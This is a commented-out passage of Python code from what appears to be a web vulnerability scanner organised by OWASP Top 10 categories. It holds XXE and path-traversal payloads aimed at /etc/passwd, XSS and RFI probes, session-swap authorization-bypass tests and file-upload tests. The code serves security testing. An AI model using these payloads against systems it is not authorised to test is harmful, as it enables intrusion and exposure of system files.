#                         (response.headers["Cache-Control"] == "no-store" and
#                          response.headers["Cache-Control"] != "no-cache, must-revalidate"):
#                     return False
#             return True
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing browser cache. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     # A3:2017-Sensitive Data Exposure
#     # checking certificate...
#
#     def check_tls(self, to_check=None):  # needs change
#         try:
#             try:
#                 my_gui.update_list_gui("Testing TLS")
#             except Exception:
#                 pass
#             context = ssl.create_default_context()
#             with socket.create_connection((self.target_url, 443)) as sockk:
#                 with context.wrap_socket(sockk, server_hostname=self.target_url) as tlssock:
#                     y = getattr(tlssock, to_check)
#                     return y()
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when checking TLS. Most likely you don't have any certificate. Error: ", e, file=self.error_file)
#             pass
#
#     def check_tls_version(self):
#         try:
#             print("\nChecking TLS extensions version...", file=self.report_file)
#             version = self.check_tls("version")
#             if version:
#                 found = True
#             else:
#                 found = False
#             legacy_tls = [x.strip() for x in config_object["TLSVERSION"]["tlsversion"].split(',')]
#             for legacy in legacy_tls:
#                 if str(version).lower() == legacy:
#                     print(version.lower, file=self.report_file)
#                     print(
#                         "[!!!-!!!] Found Legacy Version for TLS extension, this version contains cryptographic weaknesses: " + str(
#                             version), file=self.report_file)
#             if not found:
#                 print("[???-???] Cannot find the version of the TLS extension...", file=self.report_file)
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when checking TLS version. Most likely you don't have any certificate. Error: ", e, file=self.error_file)
#             pass
#
#     def check_tls_validity(self):
#         try:
#             print("\nChecking Validity of Digital Certificate...", file=self.report_file)
#             sep = " "
#             stripped = self.check_tls("getpeercert")["notAfter"].split(sep, -1)[:-1]
#             if not stripped:
#                 print("[???-???] Cannot check validity of the TLS extension...", file=self.report_file)
#                 return
#             str1 = " "
#             good_date = str1.join(stripped)
#             date_time_obj = datetime.strptime(good_date, '%b %d %H:%M:%S %Y')
#             if not date_time_obj:
#                 print("[???-???] Cannot check validity of the TLS extension...", file=self.report_file)
#                 return
#             print("Certificate expires in: ", date_time_obj-datetime.today(), file=self.report_file)
#             return
#         except Exception as e:
#             print("[???-???] Cannot check validity of the TLS extension...", file=self.report_file)
#             print("\n[ERROR] Something went wrong when checking TLS validity. Most likely you don't have any certificate. Error: ", e, file=self.error_file)
#             pass
#
#     def check_tls_issuer(self):
#         try:
#             print("\nChecking Digital Certificate Issuer...", file=self.report_file)
#             ssl_context = ssl.create_default_context()
#             with ssl_context.wrap_socket(socket.socket(), server_hostname=self.target_url) as s:
#                 s.connect((self.target_url, 443))
#                 cert = s.getpeercert()
#             if cert:
#                 subject = dict(x[0] for x in cert['subject'])
#                 issued_to = subject['commonName']
#                 issuer = dict(x[0] for x in cert['issuer'])
#                 issued_by = issuer['commonName']
#                 if issued_to and issued_by:
#                     print("Digital Certificate is issued by: ", issued_by, file=self.report_file)
#                     print("Digital Certificate is issued to: ", issued_to, file=self.report_file)
#                     return
#             else:
#                 print("[???-???] Cannot check issuer of the TLS extension...", file=self.report_file)
#                 return
#         except Exception as e:
#             print("[???-???] Cannot check issuer of the TLS extension...", file=self.report_file)
#             print("\n[ERROR] Something went wrong when checking TLS issuer. Most likely you don't have any certificate. Error: ", e, file=self.error_file)
#             pass
#
#     def check_secure_tag_cookie_sessid(self, url):
#         try:
#             cookie_dict = self.save_cookies(url)
#             if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
#                 if "secure" or not "httponly" not in str(cookie_dict).lower() or not "secure" and "httponly" not in str(cookie_dict).lower():
#                     return True
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when checking secure tag on cookie session ID storage. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     def check_form_action(self, form):
#         try:
#             try:
#                 my_gui.update_list_gui("Checking form action")
#             except Exception:
#                 pass
#             action = form.get("action")
#             if not action:
#                 return False
#             elif "http" in action and "https" not in action:
#                 return True
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when checking form action. Error: ", e, file=self.error_file)
#             print("[Error Info] FORM:", form, file=self.error_file)
#             pass
#
#     # A4:2017-XML External Entities (XXE) https://blog.cobalt.io/how-to-execute-an-xml-external-entity-injection-xxe-5d5c262d5b16
#
#     def detect_xml(self, url):
#         try:
#             response = self.session.get(url)
#             if ".xml" in url.lower() or "?xml" in str(response.text).lower():
#                 return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when trying to detect presence of XML entry point. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     def inject_xml(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing XML Injection")
#             except Exception:
#                 pass
#             list_of_xee = ['<!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://www.google.com"> ]>', '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>', '<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://www.google.com"> %xxe; ]>']
#             if self.detect_xml(url):
#                 for xee in list_of_xee:
#                     response = self.session.post(url, data=xee)
#                     if response.url == 'https://www.google.com':
#                         return 1
#                     elif 'root' == str(response.text).lower():
#                         return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing XML Injection. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     # A5:2017-Broken Access Control
#     # Directory Traversal File Include # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi
#
#     def lfi_script(self, url, script):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing for LFI")
#             except Exception:
#                 pass
#             lfi_script = script
#             url = url.replace("=", "=" + lfi_script)
#             if "root:" in self.get_content(url).text.lower():
#                 return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing LFI. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             print("[Error Info] SCRIPT:", script, file=self.error_file)
#             pass
#
#     def rfi_script(self, url, script):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing for RFI")
#             except Exception:
#                 pass
#             rfi_script = script
#             url = url.replace("=", "=" + rfi_script)
#             if self.get_content(url).url != url:
#                 return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing RFI. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             print("[Error Info] SCRIPT:", script, file=self.error_file)
#             pass
#
#     def test_lfi_directory_transversal(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing for LFI Directory Transversal")
#             except Exception:
#                 pass
#             if self.local_file_inclusion(url):
#                 return 1
#             if "=" in url:
#                 if server_set in linux_servers or server_set in mixed_servers:
#                     if self.lfi_script(url, "../../../etc/passwd") or \
#                             self.lfi_script(url, "../../../etc/passwd%00") or \
#                             self.lfi_script(url, "%252e%252e%252fetc%252fpasswd") or \
#                             self.lfi_script(url, "%252e%252e%252fetc%252fpasswd%00") or \
#                             self.lfi_script(url, "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd") or \
#                             self.lfi_script(url, "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00") or \
#                             self.lfi_script(url, "....//....//etc/passwd") or \
#                             self.lfi_script(url, "..///////..////..//////etc/passwd") or \
#                             self.lfi_script(url, "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"):
#                         return 1
#                 elif server_set in windows_servers in mixed_servers:
#                     if self.lfi_script(url, "../") or \
#                             self.lfi_script(url, "..\/") or \
#                             self.lfi_script(url, "%2e%2e%2f") or \
#                             self.lfi_script(url, "%252e%252e%252f") or \
#                             self.lfi_script(url, "%c0%ae%c0%ae%c0%af") or \
#                             self.lfi_script(url, "%uff0e%uff0e%u2215") or \
#                             self.lfi_script(url, "%uff0e%uff0e%u2216") or \
#                             self.lfi_script(url, "..././"):
#                         return 1
#                 if self.rfi_script(url, "https://www.google.com/"):
#                     return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing LFI directory transversal. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     def test_cookie_directory_transversal(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing for Cookie Directory Transversal")
#             except Exception:
#                 pass
#             dummy_session = OtherUser(config_object["CREDENTIAL"]["username_2"], config_object["CREDENTIAL"]["known_password_2"], err_file=self.error_file).session
#             cookie_dict = self.save_cookies(url, dummy_session)
#             key_list = list(cookie_dict.keys())
#             for key in key_list:
#                 dummy_session.cookies.set(key, "../")
#                 if self.get_content(url, dummy_session).url is not url:
#                     dummy_session.close()
#                     return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing cookie directory transversal. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     # Bypassing Authorization Schema
#     # Horizontal
#
#     def test_bypass_auth(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Trying to bypass authentication")
#             except Exception:
#                 pass
#             if config_object["WEBURL"]["private_info_url"] == "None":
#                 return
#             first_user_session_id = None
#             second_user_session_id = None
#             response_first_user = None
#             response_second_user = None
#             dummy_user = OtherUser(config_object["CREDENTIAL"]["username_2"],
#                                    config_object["CREDENTIAL"]["known_password_2"], url, err_file=self.error_file)
#             dummy_session = dummy_user.session
#             dummy_session.get(url)
#             cookie_dict = self.save_cookies(url, dummy_session)
#             key_list = list(cookie_dict.keys())
#             for key in key_list:
#                 if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
#                     first_user_session_id = cookie_dict[key]
#                 else:
#                     return 0
#
#             if first_user_session_id:
#                 second_user_session_id = dummy_user.get_sess_id()
#             if second_user_session_id:
#                 data = {
#                     config_object["CREDENTIAL"]["username_field"]: config_object["CREDENTIAL"]["username"]
#                 }
#                 response_first_user = dummy_session.post(config_object["WEBURL"]["private_info_url"], data=data)
#                 for key in key_list:
#                     if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
#                         dummy_session.cookies.set(key, second_user_session_id)
#                 response_second_user = dummy_session.post(config_object["WEBURL"]["private_info_url"], data=data)
#             if response_first_user and response_second_user:
#                 if str(response_first_user.text) == str(response_second_user.text):
#                     return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when trying to bypass authentication. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     # Special Request Header
#
#     def test_special_req_header(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing for special request headers")
#             except Exception:
#                 pass
#             response_wo_headers = self.session.get(url)
#             response_w_x_original = self.session.get(url, headers={"X-Original-URL": "/donotexistrandomstring1238123"})
#             response_w_x_rewrite = self.session.get(url, headers={"X-Rewrite-URL": "/donotexistrandomstring1238123"})
#             if response_wo_headers.status_code == 404 or response_w_x_original.status_code == 404 or response_w_x_rewrite.status_code == 404:
#                 return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing special headers. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#         # Privilege Escalation
#
#     def test_privilege_escalation(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing for privilege escalation")
#             except Exception:
#                 pass
#             response = self.session.get(url)
#             if "grp" or "group" or "role" in str(response.text).lower() or "grp" or "group" or "role" in response.url.lower():
#                 for data in privilege_data:
#                     response = self.session.post(url, data=data)
#                     if response.status_code != 401:
#                         return 1
#             if "X-Forwarded-For:" in response.headers:
#                 print("\n[WARN] X-Forwarded-For header present on link: ", file=self.report_file)
#                 print(url, file=self.report_file)
#                 print("Hackers may change the IP value!", file=self.report_file)
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing privilege escalation. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     # Insecure Direct Object References
#     def test_idor(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing IDOR")
#             except Exception:
#                 pass
#             attempts = 0
#             sub_string = re.findall('[?](.*)[=]*\d', url)
#             if sub_string:
#                 index_from_url = int(str(re.findall('\d', str(sub_string))))
#                 response = self.session.get(url)
#                 while attempts < 10:
#                     try:
#                         url.replace(str(index_from_url), index_from_url + 1)
#                         response_2 = self.session.get(url)
#                         if response != response_2 and str(response_2.status_code).startswith("2"):
#                             return 1
#                     except Exception as e:
#                         print(e)
#                         index_from_url += 1
#                         attempts += 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing IDOR. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     # A6:2017-Security Misconfigurations
#     # Test File Extensions Handling for Sensitive Information
#     # Present Extensions (analyze robots.txt)
#
#     def search_extensions_robots(self):  # https://github.com/danielmiessler/RobotsDisallowed/blob/master/top1000.txt
#         try:
#             try:
#                 my_gui.update_list_gui("Checking robots.txt")
#             except Exception:
#                 pass
#             f = open(config_object['FILE']['robots_dict'], "r")
#             print("\nAnalyzing robots.txt for interesting urls..!", file=self.report_file)
#             potential_display = []
#             unwanted_display_of_url = []
#             dir_list = [line.strip() for line in f.readlines()]
#             f.close()
#             robots_url = str(config_object["WEBURL"]["target"]) + "/robots.txt"
#             req_robots = self.session.get(robots_url)
#             robots_urls = re.findall('Disallow: (.*)', req_robots.text)
#             if not len(robots_urls) <= 3:
#                 print("Directories ignored by search engines:", file=self.report_file)
#                 print(*robots_urls, sep="\n", file=self.report_file)
#             else:
#                 print("No directories found inside robots.txt", file=self.report_file)
#                 return
#             print("Testing for something interesting...", file=self.report_file)
#             for item in dir_list:
#                 if item in robots_urls:
#                     potential_display.append(item)
#                 check_disallow_url = str(config_object["WEBURL"]["target"]) + str(item)
#                 if self.check_response(check_disallow_url):
#                     unwanted_display_of_url.append(check_disallow_url)
#             if potential_display:
#                 print("[!!!-!!!]Potential display of sensitive information found in robots.txt: ", file=self.report_file)
#                 print(*potential_display, sep="\n")
#             if unwanted_display_of_url:
#                 print("[!!!-???]Got OK response from the following URLs. Sensitive information might be revealed. Manual check needed: ", file=self.report_file)
#                 print(*unwanted_display_of_url, sep="\n", file=self.report_file)
#             if not potential_display or not unwanted_display_of_url:
#                 print("[END]Nothing interesting found on robots.txt. It may be empty.", file=self.report_file)
#             print("[END] End of analyzing robots.txt", file=self.report_file)
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when analyzing robots.txt. Error: ", e, file=self.error_file)
#             pass
#
#     # Form present extensions
#
#     def check_forms_files(self, form):
#         try:
#             try:
#                 my_gui.update_list_gui("Checking forms for file extensions")
#             except Exception:
#                 pass
#             action = form.get("action")
#             if not action:
#                 return False
#             elif "." in action and '/' not in action and '\\' not in action:
#                 inputs_list = form.findAll("input", type='hidden')
#                 for inputs in inputs_list:
#                     input_type = inputs.get("type")
#                     if str(input_type).lower() == "hidden":
#                         return True
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when checking form 'action' attribute. Error: ", e, file=self.error_file)
#             print("[Error Info] FORM:", form, file=self.error_file)
#             pass
#
#     # HTTP Methods
#
#     def test_http(self):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing HTTP Methods")
#             except Exception:
#                 pass
#             test_data = {"test": 'test'}
#             response = self.session.put(str(config_object['WEBURL']['target']) + '/test.html', data=test_data)
#             if str(response.status_code).startswith("3") or str(response.status_code).startswith("2"):
#                 return True
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing HTTP Methods. Error: ", e, file=self.error_file)
#             pass
#
#     # HTTP Strict Transport Security
#
#     def test_hsts(self):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing HSTS")
#             except Exception:
#                 pass
#             headers = self.get_headers(config_object['WEBURL']['target'])
#             if 'strict' not in str(headers).lower():
#                 return True
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing Strict Transport on headers. Error: ", e, file=self.error_file)
#             pass
#
#     # Test RIA
#
#     def test_ria(self, link_list):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing RIA")
#             except Exception:
#                 pass
#             content = None
#             for link in link_list:
#                 if 'clientaccesspolicy.xml' in link.lower() or 'crossdomain.xml' in link.lower():
#                     content = self.session.get(link)
#                 try:
#                     if '*' in content:
#                         return True
#                 except TypeError:
#                     pass
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing RIA. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK LIST:", link_list, file=self.error_file)
#             pass
#
#     # File Upload Vulnerability Extension
#
#     def create_file_dir(self, subdir):
#         try:
#             global temp_dir
#             filenames = ["filefortest.php", "fIleForTest.Php.JpEG", "fiL3ForTest.hTMl.JPG", "shell.phPWND", "fIleForTest.eXe.jsp"]
#             here = os.path.dirname(os.path.realpath(__file__))
#             temp_dir = os.path.join(here, subdir)
#             if not os.path.exists(temp_dir):
#                 os.mkdir(temp_dir)
#             for filename in filenames:
#                 if not os.path.isfile("./" + filename):
#                     filepath = os.path.join(here, subdir, filename)
#                     test_file = open(filepath, 'w+')
#                     test_file.write("This is unharmful content to be uploaded to the site")
#                     test_file.close()
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when creating temporary files. Error: ", e, file=self.error_file)
#             print("[Error Info] SUBDIR Name:", subdir, file=self.error_file)
#             pass
#
#     def file_upload(self, form, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing File Upload Injection")
#             except Exception:
#                 pass
#             is_file = False
#             inputs_list = form.find_all("inputs")
#             response = self.get_content(url)
#             if 'multipart/form-data' in str(response.content).lower():
#                 is_file = True
#             for inputs in inputs_list:
#                 if inputs.get("type").lower() == "file":
#                     is_file = True
#             if is_file is True:
#                 self.create_file_dir("temp")
#                 cur_path = os.path.join(os.path.dirname(__file__), 'temp')
#                 dir_listing = os.listdir(cur_path)
#                 os.chdir(cur_path)
#                 for i in dir_listing:
#                     path_for_file = os.path.relpath('..\\temp\\' + i, cur_path)
#                     f = open(path_for_file, 'rb')
#                     files = {'uploaded': f}
#                     if self.submit_form(form, "value", url, files).status_code == 200:
#                         f.close()
#                         if os.getcwd() != stable_directory:
#                             os.chdir(stable_directory)
#                         return True
#             if os.getcwd() != stable_directory:
#                 os.chdir('..')
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing file upload. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             print("[Error Info] FORM:", form, file=self.error_file)
#             pass
#
#     # Test XSS
#
#     def test_xss_in_link(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing XSS in links")
#             except Exception:
#                 pass
#             xss_test_script = "<sCriPt>alert('test')</sCRiPt>"
#             url = url.replace("=", "=" + xss_test_script)
#             response = self.session.get(url)
#             return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing XSS in link. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     def test_xss_in_form(self, form, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing XSS in forms")
#             except Exception:
#                 pass
#             xss_test_script = "<sCriPt>alert('test')</sCRiPt>"
#             response = self.submit_form(form, xss_test_script, url)
#             return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)
#         except Exception as e:
#             print("\n[ERROR] Something went wrong testing XSS in form. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             print("[Error Info] FORM:", form, file=self.error_file)
#             pass
#
#     # Test LFI
#
#     def local_file_inclusion(self, url):
#         try:
#             lfi_script = "~"
#             url = url.replace("=", "=" + lfi_script)
#             if self.check_response(url):
#                 return True
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing LFI. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     # MISC
#
#     def hidden_paths(self):
#         try:
#             if self.search_paths():
#                 print("Possible Hidden Paths Found:", file=self.map_file)
#                 print(*self.visited, sep="\n", file=self.map_file)
#             return
#         except Exception:
#             pass
#
#     def admin_directories(self):
#         try:
#             try:
#                 my_gui.update_list_gui("Searching for admin directories")
#             except Exception:
#                 pass
#             links_admin_path = []
#             has_admin_directories = self.test_role_definition_directories()
#             if has_admin_directories:
#                 for link in has_admin_directories:
#                     links_admin_path.append(link)
#                 print("\n[!!!---???] Possible Admin Path discovered for links:", file=self.report_file)
#                 print(*links_admin_path, sep="\n", file=self.report_file)
#                 print("[END] End of admin paths", file=self.report_file)
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when searching for admin directories. Error: ", e, file=self.error_file)
#             pass
#
#     def create_return_merge_links(self):
#         try:
#             global final_list
#             visible_links = len(self.target_links)
#             invisible_links_length = len(self.visited)
#             print("\nVisible Links Length:", visible_links, "\nHidden Links Length:", invisible_links_length, file=self.report_file)
#             final_list = self.target_links + self.visited
#             # print("\n[!!!-!!!] Performing tests on NOT hidden links", file=self.report_file)
#             return visible_links, final_list
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when merging hidden links with visible links lists. Error: ", e, file=self.error_file)
#             pass
#
#     def gather_info(self, url=None):
#         try:
#             if not url:
#                 try:
#                     my_gui.update_list_gui("Gathering general information")
#                 except Exception:
#                     pass
#                 print("\n\t\t\t############################# Web Application Architecture #############################", file=self.map_file)
#                 print("\nFound links in this order:\n", file=self.map_file)
#                 self.spider()
#                 print("[END] End of visible links found!", file=self.map_file)
#                 print("\n\nStarting search for hidden links..", file=self.map_file)
#                 self.hidden_paths()
#                 print("[END] End of hidden links found!\n", file=self.map_file)
#                 print("\n[NMAP] Nmap Scan Results", file=self.report_file)
#                 self.get_port_info(test=(True if config_object['TEST']['nmap_scan'].lower() == "true" else False))
#                 print("[END] End of Nmap Scan Results", file=self.report_file)
#             else:
#                 self.fingerprint(url)
#                 self.get_port(url)
#                 self.get_comments_dtds_scripts_from_content(url)
#             return
#
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when gathering information about server running on application. Error: ", e, file=self.error_file)
#             pass
#
#     # Test Suit Classifier
#
#     def test_injections(self, url, form=None, test=False):
#         try:
#             if test:
#                 if form and url:
#                     if self.test_xss_in_form(form, url):
#                         links_forms_dict_xss[url] = form
#                     if self.test_sql(form, url):
#                         links_forms_dict_sql_injection[url] = form
#                     if self.code_exec(form, url):
#                         links_forms_dict_code_exec[url] = form
#                     if self.ssi_injection(form, url):
#                         links_forms_dict_ssi_injection[url] = form
#                     if self.test_nosql(form, url):
#                         links_forms_dict_nosql_injection[url] = form
#                 elif "=" in url:
#                     if self.test_xss_in_link(url):
#                         links_xss_link.append(url)
#                     if self.html_injection(url):
#                         links_html_injection.append(url)
#                     if self.ssrf_injection(url):
#                         links_ssrf_injection.append(url)
#                 elif url:
#                     if self.javascript_exec(url):
#                         links_javascript_code.append(url)
#                     if self.host_header_injection(url):
#                         links_host_header_injection.append(url)
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing Injections. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     def test_broken_auth(self, url=None, test=False):
#         try:
#             if test:
#                 if not url:
#                     self.admin_directories()
#                 else:
#                     if "=" in url:
#                         if self.check_session_id(url):
#                             print("\n[!!!-!!!]SessionID Hijack Vulnerability found", file=self.report_file)
#                         if self.local_file_inclusion(url):
#                             links_vulnerable_to_lfi.append(url)
#                     else:
#                         if self.test_role_definition_cookie(url):
#                             links_potential_role_definition.append(url)
#                         if self.test_browser_cache_weakness(url):
#                             links_browser_cache_weakness.append(url)
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing Broken Authentication. Error: ", e, file=self.error_file)
#             pass
#
#     def test_sensitive_data_exposure(self, url=None, form=None, test=False):
#         try:
#             if test:
#                 if not url:
#                     self.check_tls_version()
#                     self.check_tls_validity()
#                     self.check_tls_issuer()
#                 else:
#                     if form:
#                         if self.check_form_action(form):
#                             links_forms__dict_sensitive_info[url] = form
#                     elif self.check_secure_tag_cookie_sessid(url):
#                         links_without_secure_cookie_with_sessid.append(url)
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing Sensitive Data Exposure. Error: ", e, file=self.error_file)
#             pass
#
#     def test_xml_external_entities(self, url=None, test=False):
#         try:
#             if test:
#                 if self.inject_xml(url):
#                     links_xee_vuln.append(url)
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing XML External Entities. Error: ", e, file=self.error_file)
#             pass
#
#     def test_broken_access_control(self, url=None, test=False):
#         try:
#             if test:
#                 if '=' in url:
#                     if self.test_idor(url):
#                         links_idor.append(url)
#                 else:
#                     if self.test_lfi_directory_transversal(url):
#                         links_lfi_directory_transversal.append(url)
#                     if self.test_cookie_directory_transversal(url):
#                         links_cookie_directory_transversal.append(url)
#                     if self.test_special_req_header(url):
#                         links_special_header.append(url)
#                     if self.test_bypass_auth(url):
#                         links_bypass_authorization.append(url)
#                     if self.test_privilege_escalation(url):
#                         links_privilege_escal.append(url)
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing Broken Access Control. Error: ", e, file=self.error_file)
#             pass
#
#     def test_security_misconfiguration(self, url=None, form=None, test=False):
#         try:
#             if test:
#                 if not url:
#                     self.search_extensions_robots()
#                     if self.test_http():
#                         print("\n[!!!---!!!] HTTP PUT Method got OK status. Application might be vulnerable!", file=self.report_file)
#                     if self.test_hsts():
#                         print(
#                             "\n[!!!---!!!] HTTP Strict Transport Security NOT found. Application is vulnerable to sniffing and certificate invalidation vulnerability!", file=self.report_file)
#                     if self.test_ria(final_list):
#                         print(
#                             "\n[!!!---???] Overly permissive policy file found. Tester must review Crossdomain.xml / Clientaccesspolicy.xml", file=self.report_file)
#                 else:
#                     if form:
#                         if self.check_forms_files(form):
#                             links_forms_files_in_form[url] = form
#                         if self.file_upload(form, url):
#                             links_forms_dict_file_upload[url] = form
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing Security Misconfiguration. Error: ", e, file=self.error_file)
#             pass
#
#     # Print Info Method
#
#     def print_report(self):
#         try:
#             try:
#                 my_gui.update_list_gui("Generating report")
#             except Exception:
#                 pass
#             if server_set:
#                 print("\n\n\t\t[DETAILED REPORT]\n", file=self.report_file)
#                 print("\nServer/s Found: ", file=self.report_file)
#                 print(*server_set, sep="\n", file=self.report_file)
#                 print("\nServer/s Found Running on Web App:", file=self.map_file)
#                 print(*server_set, sep="\n", file=self.map_file)
#             else:
#                 print("\n\n\t\t[DETAILED REPORT]\n", file=self.report_file)
#                 print("\nServer Grab Test Performed", file=self.report_file)
#                 print("[WARN] No server found!", file=self.report_file)
#
#             if comment_set:
#                 print("\n[!!!-???] Comments inside HTML DOM found.", file=self.report_file)
#                 print("Found comments inside HTML DOM. Make sure these comments do not contain any sensitive information.", file=self.report_file)
#                 print(*comment_set, sep="\n", file=self.report_file)
#                 print("[END] End of comments.", file=self.report_file)
#             else:
#                 print("\nComments Test Performed", file=self.report_file)
#                 print("[WARN] No comments found inside DOM!", file=self.report_file)
#
#             if port_set:
#                 print("\nPort/s Found on Web App:", file=self.map_file)
#                 print(*port_set, sep="\n", file=self.map_file)
#                 print("\nPort/s Found on Web App:", file=self.report_file)
#                 print(*port_set, sep="\n", file=self.report_file)
#             else:
#                 print("\nPort Scan Test Performed", file=self.report_file)
#                 print("[WARN] No information available!", file=self.report_file)
#
#             if dtd_url:
#                 print("\n[!!!-???]Found Data Type Definition (DTD) URLs on links:", file=self.report_file)
#                 print(*dtd_url, sep='\n', file=self.report_file)
#                 print("[END] End of DTD URLs.", file=self.report_file)
#             else:
#                 print("\nDTD Detection Test Performed", file=self.report_file)
#                 print("[WARN] No DTD found inside DOM!", file=self.report_file)
#
#             if script_set:
#                 print("\nFound Javascript code inside HTML DOM:", file=self.report_file)
#                 print(*script_set, sep='\n', file=self.report_file)
#                 print("[END] End of JS code inside DOM.", file=self.report_file)
#             else:
#                 print("\nJavascript Code Detection Test Performed", file=self.report_file)
#                 print("[WARN] No Javascript Code found inside DOM!", file=self.report_file)
#
#             if links_potential_role_definition:
#                 print("\n[!!!---???] Possible Role Definition Vulnerability on Cookies for links:\n", file=self.report_file)
#                 print(*links_potential_role_definition, sep="\n", file=self.report_file)
#                 print("[END] End of Role Definition Vulnerable links", file=self.report_file)
#             else:
#                 print("\nCookies Role Definition Test Performed", file=self.report_file)
#                 print("[WARN] No cookies with role storage found!", file=self.report_file)
#
#             if links_without_secure_cookie_with_sessid:
#                 print("\n[!!!---!!!] Session ID Set in Cookie but cookie is not secure. It can be sent over unencrypted channels (HTTP) Links:\n", file=self.report_file)
#                 print(*links_without_secure_cookie_with_sessid, sep="\n", file=self.report_file)
#                 print("[END] End of Insecure Cookie With Session ID SET", file=self.report_file)
#             else:
#                 print("\nSessionID Secure Tag on Cookies Test Performed", file=self.report_file)
#                 print("[WARN] No unsecure cookies found!", file=self.report_file)
#
#             if links_privilege_escal:
#                 print("\n[!!!---!!!] Application is vulnerable to Vertical Privilege Escalation on links:\n", file=self.report_file)
#                 print(*links_privilege_escal, sep="\n", file=self.report_file)
#                 print("[END] End of Vertical Privilege Escalation vulnerable links", file=self.report_file)
#             else:
#                 print("\nPrivilege Escalation Test Performed", file=self.report_file)
#                 print("[WARN] No privilege escalation vulnerability found!", file=self.report_file)
#
